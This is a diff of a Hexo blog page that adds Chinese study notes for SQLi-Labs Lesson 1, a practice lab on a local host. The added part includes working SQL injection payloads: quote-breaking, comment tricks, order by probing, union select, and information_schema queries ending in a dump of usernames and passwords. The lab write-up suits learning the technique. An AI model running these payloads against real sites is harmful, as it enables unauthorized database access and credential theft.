@@ -79,19 +79,17 @@
 
 
 
-<meta name="description" content="Lesson 1 : GET - Error based - Single quotes - String // GET-基于错误的-单引号-字符型 小知识 %20 -&amp;gt; （空格）   %22 -&amp;gt; “   %23 -&amp;gt; # 直接在浏览器中执行，要使用必须写%23  %25 -&amp;gt; %  %27 -&amp;gt; ‘  注:       做注释使用#放在地址栏必须编码%23">
+<meta name="description" content="Lesson 1 : GET - Error based - Single quotes - String // GET-基于错误的-单引号-字符型 小知识12345678%20 -&amp;gt; （空格）直接在浏览器中执行，要使用必须写%20%22 -&amp;gt; &amp;quot; %23 -&amp;gt; # 直接在浏览器中执行，要使用必须写%23%25 -&amp;gt; %%27 -&amp;gt; &amp;apos;注:1. 做">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQLi-Labs学习笔记">
 <meta property="og:url" content="http://yoursite.com/2019/01/02/SQLi-Labs学习笔记/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Lesson 1 : GET - Error based - Single quotes - String // GET-基于错误的-单引号-字符型 小知识 %20 -&amp;gt; （空格）   %22 -&amp;gt; “   %23 -&amp;gt; # 直接在浏览器中执行，要使用必须写%23  %25 -&amp;gt; %  %27 -&amp;gt; ‘  注:       做注释使用#放在地址栏必须编码%23">
+<meta property="og:description" content="Lesson 1 : GET - Error based - Single quotes - String // GET-基于错误的-单引号-字符型 小知识12345678%20 -&amp;gt; （空格）直接在浏览器中执行，要使用必须写%20%22 -&amp;gt; &amp;quot; %23 -&amp;gt; # 直接在浏览器中执行，要使用必须写%23%25 -&amp;gt; %%27 -&amp;gt; &amp;apos;注:1. 做">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://yoursite.com/Users/boy-run/Library/Application%20Support/typora-user-images/image-20190102143630845.png">
-<meta property="og:updated_time" content="2019-01-02T06:36:41.229Z">
+<meta property="og:updated_time" content="2019-01-02T07:38:13.116Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQLi-Labs学习笔记">
-<meta name="twitter:description" content="Lesson 1 : GET - Error based - Single quotes - String // GET-基于错误的-单引号-字符型 小知识 %20 -&amp;gt; （空格）   %22 -&amp;gt; “   %23 -&amp;gt; # 直接在浏览器中执行，要使用必须写%23  %25 -&amp;gt; %  %27 -&amp;gt; ‘  注:       做注释使用#放在地址栏必须编码%23">
-<meta name="twitter:image" content="http://yoursite.com/Users/boy-run/Library/Application%20Support/typora-user-images/image-20190102143630845.png">
+<meta name="twitter:description" content="Lesson 1 : GET - Error based - Single quotes - String // GET-基于错误的-单引号-字符型 小知识12345678%20 -&amp;gt; （空格）直接在浏览器中执行，要使用必须写%20%22 -&amp;gt; &amp;quot; %23 -&amp;gt; # 直接在浏览器中执行，要使用必须写%23%25 -&amp;gt; %%27 -&amp;gt; &amp;apos;注:1. 做">
 
 
 
@@ -303,23 +301,17 @@
       
         <h3 id="Lesson-1-GET-Error-based-Single-quotes-String"><a href="#Lesson-1-GET-Error-based-Single-quotes-String" class="headerlink" title="Lesson 1 : GET - Error based - Single quotes - String"></a>Lesson 1 : GET - Error based - Single quotes - String</h3><hr>
 <p>// GET-基于错误的-单引号-字符型</p>
-<h4 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h4><blockquote>
-<p>%20 -&gt; （空格）  </p>
-<p>%22 -&gt; “  </p>
-<p>%23 -&gt; # <em>直接在浏览器中执行，要使用必须写%23</em> </p>
-<p>%25 -&gt; % </p>
-<p>%27 -&gt; ‘ </p>
-<p>注:     </p>
-<ol>
-<li><p>做注释使用#放在地址栏必须编码%23     </p>
-</li>
-<li><p>做注释使用–放在地址栏必须加空格后再加字母(例如 – a), 或者使用–+      </p>
-</li>
-</ol>
-</blockquote>
+<h4 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%20 -&gt; （空格）直接在浏览器中执行，要使用必须写%20</span><br><span class="line">%22 -&gt; &quot; </span><br><span class="line">%23 -&gt; # 直接在浏览器中执行，要使用必须写%23</span><br><span class="line">%25 -&gt; %</span><br><span class="line">%27 -&gt; &apos;</span><br><span class="line">注:</span><br><span class="line">1. 做注释使用#放在地址栏必须编码%23</span><br><span class="line">2. 做注释使用--放在地址栏必须加空格后再加字母(例如 -- a), 或者使用--+</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
 <h4 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h4><p><a href="http://127.0.0.1:8088/Less-1/?id=1" target="_blank" rel="noopener">http://127.0.0.1:8088/Less-1/?id=1</a></p>
-<p>正常显示</p>
-<p><img src="/Users/boy-run/Library/Application Support/typora-user-images/image-20190102143630845.png" alt="image-20190102143630845"></p>
+<p>正常显示，加单引号后报错，试到?id=1’ or ‘1’=’1时正常显示。</p>
+<p>这时我们再尝试下注释语句，得出以下语句也是成功的。</p>
+<p>?id=1’ or 1=1 –%20<br>?id=1’ or 1=1%23</p>
+<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><h5 id="使用oder-by查询字段"><a href="#使用oder-by查询字段" class="headerlink" title="使用oder by查询字段"></a>使用oder by查询字段</h5><p>?id=1’ order by 5%23 </p>
+<p>采用折半查找，找到一个最大的不报错的数字，则为该表的字段长度，这里为3。</p>
+<h5 id="查询回显点"><a href="#查询回显点" class="headerlink" title="查询回显点"></a>查询回显点</h5><p>?id=’ union select 1,2,3%23</p>
+<p>图片中只回显2，3，可知回显点为第二、第三个字段，所以我们之后查询的内容要放在第二、第三字段才会显示。</p>
+<h5 id="MySQL常用查询"><a href="#MySQL常用查询" class="headerlink" title="MySQL常用查询"></a>MySQL常用查询</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">基本查询</span><br><span class="line">数据库版本：version()</span><br><span class="line">当前数据库：database()</span><br><span class="line">当前用户：user()</span><br><span class="line"></span><br><span class="line">查询所有数据库</span><br><span class="line">(select group_concat(schema_name) from information_schema.schemata)</span><br><span class="line">依据数据库查询表名</span><br><span class="line">(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;)</span><br><span class="line">依据数据库、表名查询列名</span><br><span class="line">(select group_concat(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;)</span><br><span class="line">查询用户名密码</span><br><span class="line">(select group_concat(username separator &apos;;&apos;) from users),(select group_concat(password separator &apos;;&apos;) from users)</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -475,7 +467,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Lesson-1-GET-Error-based-Single-quotes-String"><span class="nav-number">1.</span> <span class="nav-text">Lesson 1 : GET - Error based - Single quotes - String</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#小知识"><span class="nav-number">1.1.</span> <span class="nav-text">小知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#正文"><span class="nav-number">1.2.</span> <span class="nav-text">正文</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Lesson-1-GET-Error-based-Single-quotes-String"><span class="nav-number">1.</span> <span class="nav-text">Lesson 1 : GET - Error based - Single quotes - String</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#小知识"><span class="nav-number">1.1.</span> <span class="nav-text">小知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#正文"><span class="nav-number">1.2.</span> <span class="nav-text">正文</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#思路"><span class="nav-number">1.3.</span> <span class="nav-text">思路</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#使用oder-by查询字段"><span class="nav-number">1.3.1.</span> <span class="nav-text">使用oder by查询字段</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#查询回显点"><span class="nav-number">1.3.2.</span> <span class="nav-text">查询回显点</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#MySQL常用查询"><span class="nav-number">1.3.3.</span> <span class="nav-text">MySQL常用查询</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
